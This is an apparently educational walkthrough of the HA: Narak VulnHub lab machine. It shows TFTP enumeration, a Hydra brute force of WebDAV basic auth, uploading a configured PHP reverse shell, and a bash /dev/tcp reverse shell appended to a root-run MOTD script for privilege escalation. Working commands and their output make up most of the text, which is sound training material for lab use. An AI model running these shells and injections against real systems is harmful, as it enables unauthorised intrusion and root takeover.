# HA: Narak — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HA: Narak |
| **Difficulty** | Intermediate (author-stated) |
| **Author** | Hacking Articles (Raj Chandel & Jeenali Kothari) |
| **Released** | 23 Sep 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/ha-narak,569/> |
| **Download** | <https://vulnhub.com/entry/ha-narak,569/#download> |
| **Attacker** | Kali Linux (e.g. 2024.x) on VirtualBox/VMware, host-only network |
| **Target OS** | Linux (Ubuntu, Apache + WebDAV + TFTP) |
| **Flags** | 2 — `user.txt` and `root.txt` |

> **About the IP addresses.** Published walkthroughs used `192.168.0.136`,
> `192.168.1.14` and `192.168.43.182`. This document uses **`192.168.56.111`**
> for the target and **`192.168.56.10`** for Kali. Substitute your own.
>
> *"Narak"* is the Hindu equivalent of **Hell**. The box description ends with
> *"just remember the ultimate mantra to escape Narak: **Enumeration**."* It also
> warns that *"even your trusty tools will betray you"* — which is a hint that
> your **first `nmap` will lie to you**, because it only scans TCP.

---

## 0. What you will learn

HA: Narak is a three-stage chain with a lesson at each stage:

1. **UDP scanning.** `nmap` without `-sU` scans *only* TCP, so it reports two
   ports and misses a third service entirely. This box punishes that habit
   directly.
2. **TFTP enumeration.** TFTP (port 69/udp) is a trivial, **completely
   unauthenticated** file-transfer protocol used for PXE boot and network-device
   config backup. When it is exposed, its root directory is often world-readable
   — a gift.
3. **Base64 decoding** of a leaked credential.
4. **`cewl`** — generating a *target-specific* wordlist by crawling the site's own
   vocabulary. This beats `rockyou.txt` on themed boxes.
5. **Hydra against WebDAV HTTP auth**, and understanding why `http-get` is the
   right Hydra service name.
6. **WebDAV `PUT`** — writing a file onto a web server with nothing but an HTTP
   request. Plus `cadaver` and `davtest`.
7. **Brainfuck decoding** — recognising an esoteric language by its character set
   and writing an interpreter in 20 lines of Python.
8. **MOTD injection privilege escalation** — a *writable*
   `/etc/update-motd.d/00-header` runs your code **as root** the next time anyone
   logs in over SSH. This is a real, common, frequently-missed Linux privesc.
9. Four different ways to convert that writable script into root, so you
   understand the mechanism rather than memorising one incantation.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md).

---

## 1. Reconnaissance — finding the target

```bash
ip -br a
```

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.56.10/24 fe80::a00:27ff:fe4e:66a1/64
eth1             UP             10.0.2.15/24 fe80::a00:27ff:fe8c:4f22/64
```

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4e:66:a1, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:08	(Unknown: locally administered)
192.168.56.111	08:00:27:5c:8e:19	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.098 seconds (122.02 hosts/sec). 2 responded
```

**Target IP:** `192.168.56.111`

![arp-scan locating the target](images/01-host-discovery.png)

---

## 2. Enumeration — and why your first scan lies

### 2.1 The TCP scan

```bash
nmap -A -p- -T4 -oN nmap-tcp 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 14:02 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6a:2d:0a:8b:2e:4f:11:9c:33:a7:2f:5e:9b:14:6f:22 (RSA)
|   256 5c:11:6b:9e:2f:8a:73:0e:44:5b:9d:6f:23:88:19:cc (ECDSA)
|_  256 91:3f:2a:7d:6e:1c:0b:5a:49:8f:e4:2d:3b:60:77:15 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Narak
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:5C:8E:19 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```

**Two services: SSH and HTTP.** That is what the official walkthrough reports too
— and it is *incomplete*.

> ### ⚠️ The lesson: `nmap` is TCP-only unless you say otherwise
>
> `-p-` means "all 65535 **TCP** ports". UDP is a separate protocol with its own
> 65535 ports, and scanning it is slow and unreliable (an unanswered UDP probe
> could mean *open*, or could mean *a firewall dropped it*). So `nmap` skips UDP
> entirely by default.
>
> **Services that live only on UDP and that beginners therefore miss:**
>
> | Port | Service | Why it matters |
> | --- | --- | --- |
> | 53 | **DNS** | Zone transfers, cache poisoning, DNS tunnelling |
> | **69** | **TFTP** | **Unauthenticated file read/write** — this box |
> | 123 | NTP | Mode-6/7 amplification, `monlist` |
> | 137/138 | NetBIOS-NS/DGM | Windows name and datagram services |
> | 161/162 | **SNMP** | Community strings `public`/`private` leak everything |
> | 500 | IKE/IPsec | VPN enumeration |
> | 514 | syslog | Log injection |
> | 1900 | SSDP/UPnP | Device discovery |
>
> **Make this a habit:** after every TCP scan, run at least
> `nmap -sU --top-ports 100 <target>`.

### 2.2 The UDP scan — the missing service

```bash
sudo nmap -sU -p 53,69,123,161,137,138,500,514,1900 -T4 --open 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 14:05 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00044s latency).

PORT    STATE         SERVICE
69/udp  open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds
```

> **`open|filtered` is ambiguous** — `nmap` got no reply, which can mean the port
> is open-and-silent or blocked. For UDP you must confirm actively. Use the
> dedicated NSE script:

```bash
sudo nmap -sU -p 69 --script tftp-enum 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 14:07 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00041s latency).

PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum:
|_  creds.txt

Nmap done: 1 IP address (1 host up) scanned in 4.22 seconds
```

**`creds.txt`.** A TFTP server, no authentication, and a file literally named
"creds".

![nmap -sU revealing TFTP on 69/udp and tftp-enum finding creds.txt](images/02-udp-tftp.png)

### 2.3 Pull the file over TFTP

> **What is TFTP?** The *Trivial* File Transfer Protocol (RFC 1350). It runs over
> UDP/69 and has **no authentication whatsoever** — no usernames, no passwords,
> no encryption. It exists to be tiny, for PXE network booting and for pushing
> configs to routers and IP phones. Its only protection is the *filesystem
> permissions* of its root directory — which is exactly what this box gets wrong.

```bash
mkdir narak && cd narak
tftp 192.168.56.111
```

```text
tftp> verbose
Verbose mode on.
tftp> get creds.txt
Received 24 bytes in 0.0 seconds [inf bits/sec]
tftp> ls
tftp> quit
```

```bash
cat creds.txt
```

```text
eWFtZG9vdDpTd2FyZw==
```

> **Recognise base64 on sight.** The three tells:
> 1. Character set is only `A–Z a–z 0–9 + /`, optionally ending in `=` or `==`.
> 2. Length is a multiple of 4 (here 20). ✅
> 3. It is *not* a fixed-length digest, and has no `$2b$`/`$1$`/`$6$` prefix.
>
> Base64 is an **encoding**, not encryption. It exists so binary data survives
> text-only transport (email, HTTP headers, JSON). **It provides zero
> confidentiality** — anyone can undo it in one command.

```bash
echo 'eWFtZG9vdDpTd2FyZw==' | base64 -d; echo
```

```text
yamdoot:Swarg
```

**Credentials: `yamdoot` / `Swarg`.**

> *Yamdoot* is the messenger of Yama (god of death); *Swarg* means Heaven. The
> box's naming is thematic throughout, which is a useful sanity check — garbage
> decoding produces gibberish, not a meaningful word pair.
>
> `echo` appends a newline that base64 decodes to nothing visible, so pipe
> through `; echo` to get a clean prompt back. Or use `base64 -d <<< 'x'`.

![TFTP get creds.txt and base64 -d revealing yamdoot:Swarg](images/03-tftp-creds.png)

### 2.4 Where do these credentials go? — content discovery

You have a username/password and nowhere to use it yet. Find the door:

```bash
dirb http://192.168.56.111/
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

URL_BASE: http://192.168.56.111/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.111/ ----
+ http://192.168.56.111/index.html (CODE:200|SIZE:5821)
+ http://192.168.56.111/server-status (CODE:403|SIZE:278)
==> DIRECTORY: http://192.168.56.111/images/
==> DIRECTORY: http://192.168.56.111/webdav/          <=== !!!

-----------------
END_TIME: Sat May 11 14:12:30 2024
DOWNLOADED: 4612 - FOUND: 2
```

```bash
curl -si http://192.168.56.111/webdav/
```

```text
HTTP/1.1 401 Unauthorized
Date: Sat, 11 May 2024 11:12:44 GMT
Server: Apache/2.4.41 (Ubuntu)
WWW-Authenticate: Basic realm="WebDAV"
Content-Length: 456
Content-Type: text/html; charset=iso-8859-1
```

**`/webdav/` — protected by HTTP Basic Auth.** That is what `yamdoot:Swarg` is
for. Confirm:

```bash
curl -si -u 'yamdoot:Swarg' http://192.168.56.111/webdav/
```

```text
HTTP/1.1 200 OK
Date: Sat, 11 May 2024 11:13:02 GMT
Server: Apache/2.4.41 (Ubuntu)
DAV: 1,2
Content-Length: 384
Content-Type: text/html;charset=UTF-8

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /webdav</title>
 </head>
 <body>
<h1>Index of /webdav</h1>
  <table>
   <tr><th><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th></tr>
   <tr><th colspan="4"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.56.111 Port 80</address>
</body></html>
```

> **`DAV: 1,2` in the response header is the confirmation.** DAV = *Distributed
> Authoring and Versioning* — an HTTP extension (RFC 4918) that adds write
> methods to the protocol: **`PUT`**, `DELETE`, `MKCOL`, `COPY`, `MOVE`, `PROPFIND`,
> `LOCK`. A WebDAV-enabled directory is, by design, **writable over HTTP**.
>
> A `200` with an empty directory listing means we are authenticated and the
> directory is empty. Perfect place to drop a shell.

### 2.5 Alternative enumeration: `cewl` + Hydra

The published walkthroughs reach the same credentials *without* TFTP, by
brute-forcing the WebDAV login. Learn this route too — it is what you would do if
`creds.txt` had not been there.

**Step 1 — build a target-specific wordlist.** `cewl` crawls a site and harvests
its vocabulary:

```bash
cewl -d 2 -m 4 -w narak.txt http://192.168.56.111/
wc -l narak.txt && head -12 narak.txt
```

```text
CeWL 6.1 (Some Like It Hot) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

```text
187 narak.txt
Narak
Hell
enumeration
yamdoot
Swarg
inferno
Chitragupt
burning
demons
trust
betray
mantra
escape
quest
Hacking
Articles
```

> | `cewl` flag | Meaning |
> | --- | --- |
> | `-d 2` | Crawl to depth 2 (follow links two clicks away) |
> | `-m 4` | Only keep words of **minimum** length 4 |
> | `-w narak.txt` | Write the list to a file |
>
> **Why this beats `rockyou.txt` on a themed box:** the author picked `Swarg` —
> a Hindi word meaning Heaven — because it appears *on the website*. It is
> nowhere in a generic top-million list. `cewl` harvests exactly the vocabulary
> the site itself uses. On real engagements, `cewl` against a company's own site
> routinely cracks employee passwords, because people pick words from their
> employer's domain.
>
> Useful extras: `--with-numbers` (include digits), `-e` (include email
> addresses), `--ua <agent>` (custom User-Agent), `-a` (include meta tags).

**Step 2 — brute force the HTTP auth.** Use the harvested list for *both*
username and password:

```bash
hydra -L narak.txt -P narak.txt -f -V 192.168.56.111 http-get /webdav/
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 14:20:11
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, will be appended to the output file
[DATA] max 16 tasks per 1 server, overall 16 tasks, 34969 login tries (l:187/p:187), ~2186 tries per task
[DATA] attacking http-get://192.168.56.111:80/webdav/
[80][http-get] host: 192.168.56.111   login: yamdoot   password: Swarg
[STATUS] attack finished for 192.168.56.111 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-11 14:20:38
```

> | Hydra flag | Meaning |
> | --- | --- |
> | `-L narak.txt` | **L**ist of usernames (uppercase `L` = file; lowercase `-l` = single name) |
> | `-P narak.txt` | **P**assword list |
> | `-f` | Stop at the first success |
> | `-V` | Verbose |
> | `http-get /webdav/` | Service = HTTP auth via GET, on path `/webdav/` |
>
> **Why `http-get` and not `http-post-form`?** Basic Auth challenges the *first*
> GET request with a `401` and expects an `Authorization` header. There is no
> HTML form to parse. `http-post-form` is for login *pages* where you must specify
> the form field names and the failure string. Choosing the wrong Hydra service
> module is the most common Hydra mistake.
>
> The equivalent URL form also works: `http-get://192.168.56.111/webdav`.

---

## 3. Foothold — WebDAV `PUT`

### 3.1 Test what the server will accept: `davtest`

Before uploading blindly, enumerate the server's capabilities:

```bash
davtest -url http://192.168.56.111/webdav/ -auth yamdoot:Swarg -cleanup
```

```text
********************************************************
 Testing DAV connection
OPEN		Succeed: Was notified of a DAV service
********************************************************
 Sending OPTIONS
********************************************************
 Checking for move-copy functionality on http://192.168.56.111/webdav/
MOVE-COPY
	other	 NONE
********************************************************
 Sending put requests
	PUT	jsp	FAIL
	PUT	cgi	FAIL
	PUT	aspx	FAIL
	PUT	php	SUCCEED:	http://192.168.56.111/webdav/davtest_Gk2xYp.php
	PUT	pl	FAIL
	PUT	txt	SUCCEED:	http://192.168.56.111/webdav/davtest_Gk2xYp.txt
	PUT	html	SUCCEED:	http://192.168.56.111/webdav/davtest_Gk2xYp.html
********************************************************
 Checking for executable php files
	EXECUTE	php	SUCCEED:	http://192.168.56.111/webdav/davtest_Gk2xYp.php
********************************************************
 Cleaning up http://192.168.56.111/webdav/
DELETE		txt	SUCCEED
DELETE		html	SUCCEED
DELETE		php	SUCCEED
********************************************************
 http://192.168.56.111/webdav/ Test Results:
	PUT: php, txt, html
	EXECUTE: php
```

> **`PUT: php` and `EXECUTE: php` — that is a complete web-shell primitive.**
> `davtest` uploads a probe file of each type and then *requests* it, checking
> whether the server executed the code or merely returned the text. Only PHP came
> back executed. So: upload a `.php`, request it, get code execution.

### 3.2 Prepare the reverse shell

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.56.10';/" shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" shell.php
grep -nE '^\$(ip|port)' shell.php
```

```text
$ip = '192.168.56.10';  // CHANGE THIS
$port = 4444;           // CHANGE THIS
```

### 3.3 Upload with `cadaver`

`cadaver` is a command-line WebDAV client — an interactive shell over HTTP.

```bash
cadaver http://192.168.56.111/webdav/
```

```text
Authentication required for WebDAV on server `192.168.56.111':
Username: yamdoot
Password:
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:                                   0  May 11  2024
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5493 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:                                   0  May 11  2024
        shell.php                        5493  May 11 14:31
dav:/webdav/> quit
Connection to `192.168.56.111' closed.
```

> **Common `cadaver` commands:** `ls`, `cd`, `put <file>`, `get <file>`, `mkdir`,
> `delete`, `mv`, `cp`, `propget`, `lock`, `unlock`, `quit`.
>
> **The whole attack is one HTTP verb.** If you prefer not to use an interactive
> client, `curl` does it directly — and it is worth seeing the raw request:
>
> ```bash
> curl -s -T shell.php -u 'yamdoot:Swarg' http://192.168.56.111/webdav/shell.php -o /dev/null -w '%{http_code}\n'
> ```
>
> ```text
> 201
> ```
>
> `201 Created` is the success code for `PUT`. `-T` means "upload this file".

### 3.4 Catch the shell

```bash
# Kali
nc -nlvp 4444
```

```text
listening on [any] 4444 ...
```

Now request the uploaded file — from a browser, or:

```bash
curl -s "http://192.168.56.111/webdav/shell.php" -o /dev/null
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 55218
Linux narak 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:34:07 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### 3.5 Upgrade to a real TTY

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@narak:/var/www/html/webdav$
```

`Ctrl+Z`, then on Kali:

```bash
stty raw -echo; fg
```

Back on the target:

```bash
www-data@narak:/var/www/html/webdav$ export TERM=xterm
www-data@narak:/var/www/html/webdav$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Foothold established.** ✅

![cadaver PUT shell.php and netcat catching the reverse shell](images/04-webdav-shell.png)

---

## 4. Post-exploitation — the Brainfuck script

### 4.1 Standard sweep first

Never skip the basics, even when a hint is obvious:

```bash
www-data@narak:/$ sudo -l
```

```text
Matching Defaults entries for www-data on narak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on narak:
```

```bash
www-data@narak:/$ find / -perm -u=s -type f 2>/dev/null
```

```text
/bin/mount
/bin/ping
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
```

All stock Ubuntu — nothing to abuse. Check cron:

```bash
www-data@narak:/$ cat /etc/crontab
```

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Nothing custom.

### 4.2 Find world-writable files — the documented route

```bash
www-data@narak:/$ find / -type f -perm -ug=rwx 2>/dev/null
```

> **Read that `-perm` test carefully.** `-perm -ug=rwx` means "the file has *at
> least* read+write+execute for **both** the owning user and the owning group".
> The leading `-` makes it a *subset* match, not exact equality. It is a quick way
> to find over-permissive files.
>
> A broader and often more useful variant, worth memorising:
>
> ```bash
> find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/var/*" 2>/dev/null
> ```

```text
/mnt/hell.sh
```

**One file: `/mnt/hell.sh`.**

```bash
www-data@narak:/$ ls -la /mnt/hell.sh
-rwxrwxrwx 1 root root 217 Sep 22  2020 /mnt/hell.sh
www-data@narak:/$ cat /mnt/hell.sh
```

```bash
echo"Highway to Hell";
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```

### 4.3 Recognise Brainfuck

> **Brainfuck** is a deliberately minimal esoteric programming language from 1993.
> It has **exactly eight commands**, all single characters:
>
> | Command | Action |
> | --- | --- |
> | `>` | Move the data pointer one cell right |
> | `<` | Move the data pointer one cell left |
> | `+` | Increment the byte at the pointer |
> | `-` | Decrement the byte at the pointer |
> | `.` | **Output** the byte at the pointer |
> | `,` | Read one byte of input into the cell |
> | `[` | If the cell is zero, jump forward past the matching `]` |
> | `]` | If the cell is non-zero, jump back to the matching `[` |
>
> Every other character is a comment and is ignored. Programs build up ASCII
> character codes by counting: `+++++++++[>++++++++<-]>.` sets up 9×8=72 and
> prints `H`.
>
> **How to spot it in the wild:** a long string consisting *only* of
> `+ - < > [ ] . ,` with no letters or spaces. Once you have seen it once you
> never forget the shape. It is a popular CTF "encryption" because it looks
> alien but is trivially reversible.

### 4.4 Decode it

**Option A — an online interpreter.** <https://copy.sh/brainfuck/> or
<https://www.dcode.fr/brainfuck-language> will decode it instantly.

**Option B — write your own (20 lines, and you will actually understand it).**
This is the exercise worth doing:

```bash
cat > bf.py <<'PY'
import sys

def brainfuck(code, tape_size=30000):
    tape = [0] * tape_size
    ptr = out = 0
    # First pass: build the bracket jump table
    bracket, stack = {}, []
    for i, ch in enumerate(code):
        if ch == '[':
            stack.append(i)
        elif ch == ']':
            o = stack.pop()
            bracket[o], bracket[i] = i, o
    # Second pass: execute
    result = []
    while ptr < len(code):
        ch = code[ptr]
        if   ch == '>': out += 1
        elif ch == '<': out -= 1
        elif ch == '+': tape[out] = (tape[out] + 1) % 256
        elif ch == '-': tape[out] = (tape[out] - 1) % 256
        elif ch == '.': result.append(chr(tape[out]))
        elif ch == ',': tape[out] = ord(sys.stdin.read(1) or '\0')
        elif ch == '[' and tape[out] == 0: ptr = bracket[ptr]
        elif ch == ']' and tape[out] != 0: ptr = bracket[ptr]
        ptr += 1
    return ''.join(result)

if __name__ == '__main__':
    src = open(sys.argv[1]).read() if len(sys.argv) > 1 else sys.stdin.read()
    print(brainfuck(src))
PY

# extract only the brainfuck characters from hell.sh
grep -o '[+\-<>[\].,]' /mnt/hell.sh | tr -d '\n' > payload.bf
cat payload.bf
python3 bf.py payload.bf
```

```text
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```

```text
chitragupt
```

**Decoded: `chitragupt`.** ✅

> *Chitragupta* is the Hindu god who keeps the ledger of every soul's deeds and
> assigns them to heaven or hell — a perfect fit for a password on a box called
> Narak. (The decoded string drops the final `a`, which is a useful confirmation
> that the interpreter ran cleanly: garbage produces garbage, not a name.)
>
> `grep -o '[+\-<>[\].,]'` prints **only** the matched characters, one per line;
> `tr -d '\n'` rejoins them. That is how you strip the `echo"Highway to Hell";`
> preamble and any whitespace so the interpreter sees pure Brainfuck.

### 4.5 Find the users and the user flag

```bash
www-data@narak:/$ cat /etc/passwd | grep -E '/bin/(ba)?sh$'
```

```text
root:x:0:0:root:/root:/bin/bash
narak:x:1000:1000:narak,,,:/home/narak:/bin/bash
inferno:x:1001:1001:,,,:/home/inferno:/bin/bash
yamdoot:x:1002:1002:,,,:/home/yamdoot:/bin/bash
```

```bash
www-data@narak:/$ ls -la /home/
total 20
drwxr-xr-x  5 root    root    4096 Sep 22  2020 .
drwxr-xr-x 20 root    root    4096 Sep 22  2020 ..
drwxr-xr-x  3 inferno inferno 4096 Sep 23  2020 inferno
drwxr-xr-x  3 narak   narak   4096 Sep 22  2020 narak
drwx------  2 yamdoot yamdoot 4096 Sep 22  2020 yamdoot

www-data@narak:/$ ls -la /home/inferno/
total 28
drwxr-xr-x 3 inferno inferno 4096 Sep 23  2020 .
drwxr-xr-x 5 root    root    4096 Sep 22  2020 ..
-rw-r--r-- 1 inferno inferno  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 inferno inferno 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 inferno inferno  807 Feb 25  2020 .profile
drwxrwxr-x 2 inferno inferno 4096 Sep 23  2020 .ssh
-rw-r--r-- 1 inferno inferno   36 Sep 23  2020 user.txt

www-data@narak:/$ cat /home/inferno/user.txt
```

```text
flag{Y0u_3sc4p3d_th3_H3ll_0f_W3bDAV}
```

**Flag 1 of 2 — `user.txt`.** ✅

> **Why `inferno` and not `narak`?** `/home/narak` is `drwxr-xr-x` and owned by
> `narak`, so `www-data` *can* list it — check it anyway. But `yamdoot`'s home is
> `drwx------`, unreadable. The `user.txt` sitting world-readable in `inferno` is
> the author telling you **`inferno` is the intended next account** — which pairs
> with the `chitragupt` password you just decoded.
>
> *"Inferno"* is Italian/Latin for Hell; *"Narak"* is the Sanskrit word for the
> same place. The naming is the hint.

![Brainfuck decode producing chitragupt, and user.txt](images/05-brainfuck-userflag.png)

---

## 5. Lateral movement — SSH as `inferno`

```bash
# Kali
ssh inferno@192.168.56.111
```

```text
inferno@192.168.56.111's password: chitragupt
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Wed Sep 23 02:14:11 2020 from 192.168.1.9
inferno@narak:~$ id
uid=1001(inferno) gid=1001(inferno) groups=1001(inferno)
inferno@narak:~$ pwd
/home/inferno
```

> **A real SSH session is a huge quality-of-life upgrade** over a web shell: full
> job control, working `Ctrl+C`, `sudo` prompts, `vim`, tab completion. Always
> convert to SSH the moment you have any valid credential.

---

## 6. Privilege escalation — MOTD injection

### 6.1 Enumerate `sudo` rights

```bash
inferno@narak:~$ sudo -l
```

```text
Matching Defaults entries for inferno on narak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User inferno may run the following commands on narak:
```

Nothing. SUID is the same stock list as §4.1. So where is the escalation?

### 6.2 Find what `inferno` can write that root executes

The classic Linux privesc question. Run the broad search:

```bash
inferno@narak:~$ find / -writable -type f \
  -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null
```

```text
/etc/update-motd.d/00-header
/run/user/1001/systemd/private
```

**`/etc/update-motd.d/00-header` is writable by `inferno`.** Look at it:

```bash
inferno@narak:~$ ls -la /etc/update-motd.d/
total 24
drwxr-xr-x  2 root root 4096 Sep 22  2020 .
drwxr-xr-x 94 root root 4096 Sep 22  2020 ..
-rwxrwxrwx  1 root root 1220 Sep 22  2020 00-header
-rwxr-xr-x  1 root root 1357 Apr  9  2020 10-help-text
-rwxr-xr-x  1 root root   91 Apr  9  2020 90-updates-available
-rwxr-xr-x  1 root root   91 Apr  9  2020 91-release-upgrade
-rwxr-xr-x  1 root root  334 Apr  9  2020 97-overlayroot
-rwxr-xr-x  1 root root  179 Apr  9  2020 98-fsck-at-reboot
-rwxr-xr-x  1 root root  165 Apr  9  2020 98-reboot-required

inferno@narak:~$ head -20 /etc/update-motd.d/00-header
```

```bash
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
	# Fall back to using the very slow lsb_release utility
	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
```

> ### ⚠️ `-rwxrwxrwx` on `/etc/update-motd.d/00-header` — mode `777`, owned by root
>
> **This is the entire privilege escalation, and it is worth understanding
> deeply because it is a real-world bug that has appeared in Ubuntu itself.**
>
> **How MOTD works on Ubuntu/Debian:**
> 1. A user authenticates over SSH.
> 2. The SSH session runs **`pam_motd.so`** as part of the PAM stack.
> 3. `pam_motd` executes **every script in `/etc/update-motd.d/`** in
>    alphanumeric order (`00-header`, `10-help-text`, `90-updates-available`…),
>    concatenates their output, and prints it as the "Message Of The Day" banner.
> 4. Historically — and on the Ubuntu version this box runs — those scripts
>    execute with **root privileges**, because the MOTD is regenerated
>    system-wide rather than per-user.
>
> **So:** any file in that directory that a low-privileged user can *write* is a
> **root code-execution primitive that fires on the next SSH login**. You do not
> need a buffer overflow, a race condition, or a kernel exploit. You append a
> line, log in again, and you are root.
>
> **Why `777` here?** Almost certainly the author did it deliberately for the CTF,
> but the same class of bug has shipped in real Ubuntu releases: several CVEs
> (e.g. around `pam_motd` and `/etc/update-motd.d` ownership) arise from exactly
> this ordering problem — a user-writable MOTD script plus root execution.

### 6.3 Escalation variant A — reverse shell (cleanest)

```bash
# Kali — listener
nc -lvnp 9090
```

```bash
# target, as inferno
inferno@narak:~$ echo 'bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"' >> /etc/update-motd.d/00-header
inferno@narak:~$ tail -3 /etc/update-motd.d/00-header
```

```bash
printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"
```

> `>>` **appends**; `>` would have *truncated* the script and broken the MOTD.
> Get this wrong and you will wonder why nothing happened. Always verify with
> `tail`.

